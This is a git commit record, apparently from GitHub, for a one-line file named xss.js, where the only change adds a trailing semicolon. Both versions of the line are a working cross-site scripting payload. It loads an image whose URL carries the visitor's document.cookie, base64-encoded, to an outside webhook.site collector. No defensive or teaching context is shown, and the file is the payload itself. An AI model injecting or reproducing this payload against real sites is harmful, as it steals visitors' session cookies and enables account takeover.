078df1d19c262d7371dd1c22ddc1c1ac560f6601
tyfooon <71284756+tyfooon@users.noreply.github.com>
2025-10-03 01:57:46 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/d931896c-af2c-4c05-b3d6-572c96cc6105?data='+btoa(document.cookie)
+x = new Image(); x.src = 'https://webhook.site/d931896c-af2c-4c05-b3d6-572c96cc6105?data='+btoa(document.cookie);
